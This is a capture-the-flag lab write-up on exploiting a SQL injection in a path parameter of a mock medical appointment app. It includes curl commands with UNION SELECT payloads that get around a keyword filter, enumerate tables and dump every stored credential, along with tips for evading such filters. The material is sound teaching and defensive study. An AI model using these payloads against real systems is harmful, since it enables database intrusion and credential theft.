---
title: MedNode - SQLi
tags:
  - bugforge
  - sqli
  - path-injection
  - waf-bypass
aliases:
  - "/BugForge/MedNode---SQLi"
---
- Medical appointment platform with doctor/patient roles
- SQL injection in an authenticated path parameter - Express route captures the injected payload before SQLite processes it
- WAF blocks `OR` and `;` but UNION SELECT sails through

## Setup

Grab your URL from the lab page and export it:

```bash
export TARGET="https://YOUR-LAB-URL.labs-app.bugforge.io"
```

Verify it's alive:

```bash
curl -s $TARGET | grep -o '<title>.*</title>'
# <title>MedNode — Patient Login</title>
```

## Enumeration

**Tech Stack**: Express.js (X-Powered-By header), JWT auth (HS256), SQLite

**Roles**: `doctor` (manages appointments, accepts/denies requests) and `patient` (books appointments, cancels them)

The landing page and `/register.html` reveal the registration form fields: `full_name`, `username`, `password`. No role field is visible in the HTML.

### API Surface (post-auth discovery)

After registration and login, the frontend JS (`/js/patient.js` and `/js/doctor.js`) reveals:

```
POST /api/auth/register       - full_name, username, password
POST /api/auth/login          - username, password -> JWT
GET  /api/appointments        - List user's appointments
POST /api/appointments        - Create appointment (doctor_id, appointment_date, appointment_time, reason_id)
POST /api/appointments/:id/cancel  - Cancel by ID (path param)
GET  /api/doctors             - List doctors
GET  /api/reasons             - List reasons
GET  /api/appointment-requests     - Doctor: pending requests
POST /api/appointment-requests/:id/:action  - Doctor: accept/deny
```

### Key Observation

Two endpoints accept path parameters as integer IDs:
- `POST /api/appointments/:id/cancel`
- `POST /api/appointment-requests/:id/:action`

Express route matching captures everything between the slashes as the `:id` parameter. If the app concatenates this directly into SQL without parameterization, the path IS the injection point.

## Thought Process

### Why path-param SQLi?

The login endpoint uses parameterized queries (tested `' OR 1=1--` -- returned 401 "Invalid credentials" with no error leak). But the cancel endpoint takes a user-controlled integer from the URL path and the app trusts it because "it's supposed to be an integer from my own frontend."

This is a common pattern in Express apps:

```javascript
// Vulnerable pattern
const id = req.params.id;
db.get(`SELECT * FROM appointments WHERE id = ${id}`, ...);
```

### Confirming injection

A single quote in the path triggers a raw SQLite error:

```bash
curl -s "$TARGET/api/appointments/1'--/cancel" \
  -X POST \
  -H "Authorization: Bearer $TOKEN"
```
```json
{"error":"unrecognized token: \"'--\""}
```

This tells us:
1. The app directly interpolates the path param into SQL
2. It's SQLite (error format)
3. The param is in integer context (the quote breaks parsing, it's not inside quotes)

### WAF discovery

```bash
# Blocked (403 Forbidden):
/api/appointments/1%20OR%201=1--/cancel       # OR keyword blocked
/api/appointments/1;SELECT%20*--/cancel       # Semicolons blocked

# Allowed (500 with SQL error):
/api/appointments/1'%20UNION%20SELECT%201--/cancel   # UNION passes through
```

The filter is keyword-based and incomplete -- blocks `OR` and `;` but misses `UNION SELECT`.

### Finding column count

UNION requires matching the column count of the original query. Tried `SELECT 1` through `SELECT 1,2,...,12` -- all returned column mismatch. The breakthrough was using `NULL` values:

```bash
# 7 columns matches:
/api/appointments/0%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL--/cancel
```
```json
{
  "message": "Appointment cancelled",
  "appointment": {
    "id": null, "doctor_id": null, "patient_id": null,
    "appointment_date": null, "appointment_time": null,
    "reason_id": null, "status": null
  }
}
```

The response reveals the column names: `id, doctor_id, patient_id, appointment_date, appointment_time, reason_id, status`.

## Exploitation

### Step 1: Register and Login

```bash
# Register
curl -s $TARGET/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"Pass1234","full_name":"Test User"}'
# {"message":"Account created"}

# Login
curl -s $TARGET/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"Pass1234"}'
# Returns JWT token
```

Save the token:

```bash
export TOKEN="eyJhbGciOiJIUzI1NiIs..."
```

### Step 2: Enumerate tables

```bash
curl -s "$TARGET/api/appointments/0%20UNION%20SELECT%20GROUP_CONCAT(name,'|'),NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20sqlite_master%20WHERE%20type%3D'table'--/cancel" \
  -X POST \
  -H "Authorization: Bearer $TOKEN"
```
```json
{
  "appointment": {
    "id": "users|sqlite_sequence|reasons|appointment_requests|appointments"
  }
}
```

### Step 3: Extract users table schema

```bash
curl -s "$TARGET/api/appointments/0%20UNION%20SELECT%20sql,NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20sqlite_master%20WHERE%20name%3D'users'--/cancel" \
  -X POST \
  -H "Authorization: Bearer $TOKEN"
```
```json
{
  "appointment": {
    "id": "CREATE TABLE users (\n      id INTEGER PRIMARY KEY AUTOINCREMENT,\n      username TEXT UNIQUE NOT NULL,\n      password TEXT NOT NULL,\n      role TEXT NOT NULL CHECK(role IN ('doctor', 'patient')),\n      full_name TEXT NOT NULL\n    )"
  }
}
```

### Step 4: Dump all credentials

```bash
curl -s "$TARGET/api/appointments/0%20UNION%20SELECT%20GROUP_CONCAT(id||':'||username||':'||password||':'||role,'||'),NULL,NULL,NULL,NULL,NULL,NULL%20FROM%20users--/cancel" \
  -X POST \
  -H "Authorization: Bearer $TOKEN"
```

| ID | Username | Password | Role |
|----|----------|----------|------|
| 1 | dr.smith | `bug{spoYugQrJlsyz2MIapFp9upng4LoZP1l}` | doctor |
| 2 | dr.jones | `bug{spoYugQrJlsyz2MIapFp9upng4LoZP1l}` | doctor |
| 3 | jeremy | `bug{spoYugQrJlsyz2MIapFp9upng4LoZP1l}` | patient |
| 4 | jessamy | `bug{spoYugQrJlsyz2MIapFp9upng4LoZP1l}` | patient |

Seeded users have the flag as their password in plaintext.

## Dead Ends

| Attempt | Result | Lesson |
|---------|--------|--------|
| `' OR 1=1--` on `/api/auth/login` | 401 Invalid credentials | Login uses parameterized queries |
| `OR 1=1` in path param | 403 Forbidden | WAF blocks `OR` keyword |
| Semicolons for stacked queries | 403 Forbidden | WAF blocks `;` |
| UNION with integer values (1,2,3...) | Column mismatch | SQLite type affinity -- `NULL` works where integers don't |
| Mass assignment `role:"doctor"` on register | Not tested (SQLi found first) | Would have been viable -- CHECK constraint in schema confirms role field exists |

## Attack Chain

```
Register patient account
         |
         v
Login -> JWT with role:"patient"
         |
         v
POST /api/appointments/[PAYLOAD]/cancel
         |
         v
Express captures UNION SELECT as :id param
         |
         v
SQLite executes: SELECT * FROM appointments WHERE id = 0 UNION SELECT ...
         |
         v
Full database dump (users table with flag)
```

## Rate Limiting Note

The login endpoint has rate limiting (X-Ratelimit-Limit: 10, resets every ~900s). The appointments cancel endpoint does NOT have rate limiting -- unlimited injection attempts.

## Takeaways

**Classification**: CWE-89 (SQL Injection), OWASP A03:2021

**Root causes**:
- Path parameter concatenated directly into SQL query without parameterization
- Incomplete WAF -- blocks `OR` and `;` but allows `UNION SELECT` (blacklist approach fails)
- Error messages leak database engine and query structure to the attacker
- Rate limiting applied to login but not to the vulnerable endpoint

**Key patterns**:
1. Path parameters are injection points too -- not just query strings and POST bodies. Express `req.params.id` is user-controlled input
2. Keyword-based WAFs are trivially bypassed. If `OR` is blocked, `UNION SELECT` likely isn't. If both are blocked, try `UNiON`, case mixing, or comments (`UN/**/ION`)
3. Integer-context injection (no surrounding quotes) means you don't need a quote prefix -- just append `UNION SELECT` directly
4. `NULL` values in UNION match any column type in SQLite. When numeric columns reject integer UNION values, try NULL
5. Always test authenticated endpoints for injection. The pre-auth surface (login/register) may be properly secured while post-auth endpoints (cancel, update, delete) are vulnerable -- developers sometimes relax input validation behind auth
